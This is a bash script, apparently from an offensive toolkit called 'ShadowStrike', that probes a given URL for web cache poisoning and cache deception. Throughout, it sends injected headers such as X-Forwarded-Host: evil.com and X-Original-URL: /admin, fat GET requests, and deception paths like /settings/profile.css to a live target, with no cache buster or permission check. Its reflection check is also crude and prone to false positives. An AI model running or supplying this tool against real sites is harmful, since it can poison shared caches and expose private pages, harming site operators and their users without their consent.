#!/bin/bash
# Web Cache Poisoning + Web Cache Deception Scanner

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 https://target.com" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — CACHE POISONING SCANNER    ║"
echo "╚══════════════════════════════════════════════╝"

# 1. Проверка заголовков кэширования
echo "[CACHE] Checking cache headers..."
HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
echo "$HEADERS" | grep -qi "X-Cache\|CF-Cache-Status\|X-Cached" && echo "  🟡 Cache detected!"
echo "$HEADERS" | grep -qi "Vary:" && echo "  ✅ Vary header: $(echo "$HEADERS" | grep -i 'Vary:' | head -1)"

# 2. Тест на Cache Poisoning через X-Forwarded-Host
echo "[CACHE] Testing X-Forwarded-Host poisoning..."
for header in "X-Forwarded-Host: evil.com" "X-Forwarded-Scheme: http" "X-Original-URL: /admin" "X-Rewrite-URL: /admin"; do
    h_name="${header%%:*}"
    h_value="${header##*: }"
    
    RESP=$(curl -sk --max-time 5 -H "$h_name: $h_value" "$TARGET" -o /tmp/cache_test.html -w "%{http_code}" 2>/dev/null)
    
    # Проверяем отразился ли заголовок в ответе
    if grep -qi "evil.com\|/admin" /tmp/cache_test.html 2>/dev/null; then
        echo "  🔴 POISONING possible: $h_name"
    fi
done

# 3. Тест на Cache Deception
echo "[CACHE] Testing Cache Deception..."
for ext in ".css" ".js" ".png" ".jpg" ".gif" ".woff2"; do
    CODE=$(curl -sk --max-time 5 -H "X-Original-URL: /admin$ext" "$TARGET/nonexistent$ext" -o /dev/null -w "%{http_code}" 2>/dev/null)
    [ "$CODE" = "200" ] && echo "  🔴 DECEPTION possible: $ext extension"
done

# 4. Проверка на Web Cache Deception (старый метод)
echo "[CACHE] Testing legacy deception..."
RESP=$(curl -sk --max-time 5 "$TARGET/settings/profile.css" -o /tmp/cache_dec.html -w "%{http_code}" 2>/dev/null)
if [ "$RESP" = "200" ] && grep -qi "profile\|settings\|account" /tmp/cache_dec.html 2>/dev/null; then
    echo "  🔴 DECEPTION: sensitive data cached as CSS!"
fi

# 5. Тест на Fat GET
echo "[CACHE] Testing Fat GET..."
RESP=$(curl -sk --max-time 5 -X GET -d "param=value" "$TARGET" -o /tmp/cache_fat.html -w "%{http_code}" 2>/dev/null)
if [ "$RESP" = "200" ]; then
    echo "  🟡 Fat GET accepted — possible poisoning vector"
fi

echo "[CACHE] Done"
